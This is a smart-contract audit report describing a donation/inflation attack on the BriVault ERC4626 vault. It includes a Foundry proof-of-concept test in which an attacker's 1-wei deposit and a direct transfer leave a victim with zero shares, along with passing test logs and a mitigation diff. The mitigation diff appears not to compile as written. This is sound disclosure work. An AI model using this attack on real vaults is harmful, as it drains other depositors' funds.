
# Finding Title

Share Calculation Can Be Manipulated via Direct Transfers, Leading to Unfair Share Pricing and Potential Loss of Value for Users

## Root + Impact

- **Root:** The custom `_convertToShares` function calculates share prices based on the raw token balance of the contract (`asset.balanceOf(address(this))`), which can be artificially inflated by direct `transfer` calls (donations).
- **Impact:** An early depositor can manipulate the share price to be extremely high. Subsequent depositors will then receive far fewer shares than the fair value of their assets, and in minimal configurations, can receive zero shares, effectively losing their entire deposit to the vault. This breaks the fundamental fairness of the ERC4626 vault standard.

## Description

A core promise of an ERC4626 vault is that the number of shares minted should fairly represent the value of the assets deposited. The `BriVault` contract implements a custom share calculation mechanism that is vulnerable to a well-known inflation attack.

The `_convertToShares` function uses the contract's live token balance to determine the price of a share. An attacker can exploit this by:

1. Depositing a very small amount of assets to mint a small number of initial shares (e.g., 1 share for 1 wei).
2. Directly transferring a large amount of the underlying asset to the contract address. This inflates the `asset.balanceOf(address(this))` without creating any new shares.
3. As a result, the calculated price per share becomes astronomically high.

When a legitimate user (the victim) subsequently makes a large deposit, the `Math.mulDiv` calculation in `_convertToShares` rounds down significantly due to the manipulated ratio.

- **Under minimal fee/deposit configurations:** The victim can receive **zero shares**, losing their entire deposit.
- **Under the project's default configurations:** The victim receives a positive but unfairly small number of shares, meaning they have significantly overpaid for their portion of the vault.

This vulnerability undermines the economic safety of the vault and can lead to a direct loss of value for users.

```solidity
// src/briVault.sol

function _convertToShares(uint256 assets) internal view returns (uint256 shares) {
    // @> `balanceOfVault` is read directly and can be manipulated by external transfers.
    uint256 balanceOfVault = IERC20(asset()).balanceOf(address(this));
    uint256 totalShares = totalSupply();

    if (totalShares == 0 || balanceOfVault == 0) {
        return assets;
    }

    // @> If `balanceOfVault` is artificially inflated, the result of this division
    // @> can round down to zero for the victim, or result in an unfair price.
    shares = Math.mulDiv(assets, totalShares, balanceOfVault);
}

function deposit(uint256 assets, address receiver) public override returns (uint256) {
    // ...
    uint256 participantShares = _convertToShares(stakeAsset);
    // ...
    _mint(msg.sender, participantShares);
    // @> There is no check to ensure `participantShares > 0`, allowing a user
    // @> to deposit assets and receive nothing in return.
}
```

## Risk

**Likelihood**: High

* This is a well-documented attack vector for non-standard ERC4626 implementations. It can be executed by any user who is able to be the first or an early depositor.

**Impact**: High

* **Significant Financial Loss for Users:** Users can lose a substantial portion or, in some cases, all of their deposited funds' value by receiving far too few shares or zero shares.
* **Broken Core Vault Mechanics:** The vault fails its primary function of fairly representing deposited assets with tokenized shares, destroying trust in the protocol's accounting.

## Proof of Concept

The following tests validate the vulnerability under two different configurations, demonstrating its severity and practicality.

- **Test A (`test_donationAttack_minimalConfig_victimGetsZeroShares`)** proves that with minimal fees and deposit requirements, the victim receives zero shares, leading to a complete loss of their deposited assets.
- **Test B (`test_donationAttack_defaultConfig_victimGetsPositiveButReducedShares`)** proves that even under the project's default settings, the victim receives an unfairly low number of shares, demonstrating the price manipulation.

```solidity
// test/ShareDonationAttack.t.sol

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {BriVault} from "../src/briVault.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {MockERC20} from "./MockErc20.t.sol";

/**
 * Realistic PoC tests against the actual BriVault contract to validate
 * the donation/inflation attack described in Ai_Studio_Reports/333.md.
 *
 * Notes:
 * - Comments are in English.
 * - Console outputs are plain English (no hex, no icons).
 * - Tests live in a separate file to avoid build issues.
 */
contract ShareDonationAttackTest is Test {
    // Common test actors
    address internal owner = makeAddr("owner");
    address internal attacker = makeAddr("attacker");
    address internal victim = makeAddr("victim");

    // Token and vault under test
    MockERC20 internal mockToken;
    BriVault internal briVault;

    // Baseline tournament params
    uint256 internal eventStartDate;
    uint256 internal eventEndDate;
    address internal feeAddr;

    function setUp() public {
        // Deploy mock token and mint balances
        mockToken = new MockERC20("Mock Token", "MTK");
        mockToken.mint(owner, 1_000 ether);
        mockToken.mint(attacker, 1_000 ether);
        mockToken.mint(victim, 1_000 ether);

        // Tournament window (future start)
        eventStartDate = block.timestamp + 2 days;
        eventEndDate = eventStartDate + 30 days;
        feeAddr = makeAddr("feeAddr");
    }

    /**
     * Case A: Minimal configuration that matches the report’s scenario
     * - participationFeeBsp = 0 (to focus on share math)
     * - minimumAmount = 0 (allows 1 wei first deposit)
     * Outcome: Victim receives 0 shares due to donation-inflated vault balance.
     */
    function test_donationAttack_minimalConfig_victimGetsZeroShares() public {
        // Deploy a vault configured to allow tiny initial deposit
        vm.startPrank(owner);
        briVault = new BriVault(
            IERC20(address(mockToken)),
            0, // participationFeeBsp
            eventStartDate,
            feeAddr,
            0, // minimumAmount
            eventEndDate
        );
        vm.stopPrank();

        // Approvals
        vm.prank(attacker);
        mockToken.approve(address(briVault), type(uint256).max);
        vm.prank(victim);
        mockToken.approve(address(briVault), type(uint256).max);

        // 1) Attacker is the first depositor with 1 wei -> mints 1 share
        vm.startPrank(attacker);
        uint256 attackerInitialDeposit = 1; // 1 wei
        uint256 attackerShares = briVault.deposit(attackerInitialDeposit, attacker);
        vm.stopPrank();

        console.log("Attacker minted shares:", attackerShares); // Expect 1
        assertEq(attackerShares, 1, "First depositor should mint 1 share");
        assertEq(briVault.balanceOf(attacker), 1, "Attacker owns 1 share");

        // 2) Attacker donates a large amount directly to the vault
        vm.prank(attacker);
        uint256 attackerDonation = 100 ether; // large donation inflates vault balance
        mockToken.transfer(address(briVault), attackerDonation);

        uint256 vaultBalanceAfterDonation = mockToken.balanceOf(address(briVault));
        console.log("Vault balance after donation:", vaultBalanceAfterDonation);
        console.log("Total shares after donation:", briVault.totalSupply()); // Still 1

        // 3) Victim deposits a large amount but receives 0 shares due to rounding down
        vm.startPrank(victim);
        uint256 victimDeposit = 10 ether;
        uint256 victimShares = briVault.deposit(victimDeposit, victim);
        vm.stopPrank();

        console.log("Victim deposited:", victimDeposit);
        console.log("Victim received shares:", victimShares);
        assertEq(victimShares, 0, "Victim should receive 0 shares under donation attack");
        assertEq(briVault.balanceOf(victim), 0, "Victim owns 0 shares");
    }

    /**
     * Case B: Default-like configuration used in project tests
     * - participationFeeBsp = 150 (1.5%)
     * - minimumAmount = 0.0002 ether
     * Outcome: Victim receives positive shares (not zero), but share issuance
     *          is still manipulated by donation (unfair pricing).
     */
    function test_donationAttack_defaultConfig_victimGetsPositiveButReducedShares() public {
        // Deploy a vault with default-like parameters seen in existing tests
        vm.startPrank(owner);
        briVault = new BriVault(
            IERC20(address(mockToken)),
            150, // 1.5%
            eventStartDate,
            feeAddr,
            0.0002 ether, // minimumAmount
            eventEndDate
        );
        vm.stopPrank();

        // Approvals
        vm.prank(attacker);
        mockToken.approve(address(briVault), type(uint256).max);
        vm.prank(victim);
        mockToken.approve(address(briVault), type(uint256).max);

        // 1) Attacker first deposit with a non-trivial amount (respects minimum + fee)
        vm.startPrank(attacker);
        uint256 attackerAssets = 1 ether;
        uint256 attackerShares = briVault.deposit(attackerAssets, attacker);
        vm.stopPrank();

        console.log("Attacker minted shares (default config):", attackerShares);
        assertGt(attackerShares, 0, "Attacker should mint > 0 shares at start");

        // 2) Attacker donates a large amount to inflate vault balance
        vm.prank(attacker);
        uint256 donation = 100 ether;
        mockToken.transfer(address(briVault), donation);
        console.log("Vault balance after donation (default):", mockToken.balanceOf(address(briVault)));

        // 3) Victim deposits a large amount; receives >0 shares but unfairly reduced
        vm.startPrank(victim);
        uint256 victimAssets = 10 ether;
        uint256 victimShares = briVault.deposit(victimAssets, victim);
        vm.stopPrank();

        console.log("Victim shares (default config):", victimShares);
        assertGt(victimShares, 0, "Victim should receive > 0 shares with non-trivial totalSupply");
        // Sanity check: price inflation reduces shares per asset for the victim.
        // We expect victim shares to be much smaller than their asset amount due to inflated vault balance.
        assertLt(victimShares, attackerShares, "Victim shares per deposit are reduced vs first depositor");
    }
}
```

**Test Results:**

```bash
➜  2025-11-brivault git:(main) ✗ forge test --match-contract ShareDonationAttac
kTest -vv

Ran 2 tests for test/ShareDonationAttack.t.sol:ShareDonationAttackTest
[PASS] test_donationAttack_defaultConfig_victimGetsPositiveButReducedShares() (gas: 3825147)
Logs:
  Attacker minted shares (default config): 985000000000000000
  Vault balance after donation (default): 100985000000000000000
  Victim shares (default config): 96076149923255929

[PASS] test_donationAttack_minimalConfig_victimGetsZeroShares() (gas: 3753199)
Logs:
  Attacker minted shares: 1
  Vault balance after donation: 100000000000000000001
  Total shares after donation: 1
  Victim deposited: 10000000000000000000
  Victim received shares: 0

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 5.65ms (4.52ms CPU time)
```

## Recommended Mitigation

The contract should not use a custom, vulnerable share calculation. It should either adopt the battle-tested OpenZeppelin ERC4626 implementation, which includes mitigations for this attack, or implement similar protections.

**Recommended Fix: Align with Secure ERC4626 Practices**

1. Remove the custom `_convertToShares` function.
2. Override `totalAssets()` to correctly report the vault's underlying assets.
3. Use the inherited, secure `_deposit` function from the OpenZeppelin contract.
4. Add a critical check to ensure that a deposit results in at least one share.

```diff
// src/briVault.sol

contract BriVault is ERC4626, Ownable {
    // ...

-   function _convertToShares(uint256 assets) internal view returns (uint256 shares) {
-       uint256 balanceOfVault = IERC20(asset()).balanceOf(address(this));
-       uint256 totalShares = totalSupply();
-       if (totalShares == 0 || balanceOfVault == 0) {
-           return assets;
-       }
-       shares = Math.mulDiv(assets, totalShares, balanceOfVault);
-   }

+   function totalAssets() public view virtual override returns (uint256) {
+       // This should reflect the total assets managed by the vault.
+       // For this simple vault, it's the contract's balance.
+       return asset().balanceOf(address(this));
+   }

    function deposit(uint256 assets, address receiver) public override returns (uint256) {
        // ... (fee calculation and checks remain) ...
        uint256 stakeAsset = assets - fee;

+       // Use the preview function from the standard ERC4626 implementation
+       uint256 shares = previewDeposit(stakeAsset);
+       require(shares > 0, "BriVault: zero shares minted");

        stakedAsset[receiver] = stakeAsset;

        IERC20(asset()).safeTransferFrom(msg.sender, participationFeeAddress, fee);

-       // Manual asset transfer and minting are replaced by the secure internal function
-       IERC20(asset()).safeTransferFrom(msg.sender, address(this), stakeAsset);
-       _mint(msg.sender, participantShares);
+       // The _deposit function handles the asset transfer and minting safely
+       _deposit(msg.sender, receiver, stakeAsset, shares);

        emit deposited(receiver, stakeAsset);
-       return participantShares;
+       return shares;
    }

    // ...
}
```
